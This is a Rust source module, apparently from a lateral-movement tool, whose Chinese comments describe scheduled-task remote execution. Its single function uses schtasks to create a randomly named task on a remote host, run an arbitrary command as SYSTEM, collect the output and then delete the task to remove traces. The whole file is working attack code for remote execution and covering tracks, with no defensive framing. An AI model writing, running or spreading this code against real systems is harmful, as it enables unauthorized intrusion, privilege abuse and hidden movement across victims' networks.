//! 计划任务远程执行模块

use crate::lateral::LateralConfig;

pub async fn execute_schtasks(config: &LateralConfig) -> Result<(String, String, i32), String> {
    let target = &config.target;
    let task_name = crate::lateral::random_service_name();
    let full_command = format!("{} {}", config.command, config.args.join(" "));

    tracing::info!("[SchTasks] {} -> {} (任务: {})", whoami::hostname(), target, task_name);

    let result = std::process::Command::new("schtasks")
        .args([
            "/create", "/tn", &task_name,
            "/tr", &full_command,
            "/s", target,
            "/sc", "once",
            "/st", "00:00",
            "/ru", "SYSTEM",
            "/f",
        ])
        .output()
        .map_err(|e| format!("创建任务失败: {}", e))?;

    if !result.status.success() {
        return Err(String::from_utf8_lossy(&result.stderr).to_string());
    }

    let run_result = std::process::Command::new("schtasks")
        .args(["/run", "/tn", &task_name, "/s", target])
        .output()
        .map_err(|e| format!("运行任务失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&run_result.stdout).to_string();

    // 清理
    let _ = std::process::Command::new("schtasks")
        .args(["/delete", "/tn", &task_name, "/s", target, "/f"])
        .output();

    Ok((stdout, String::new(), 0))
}
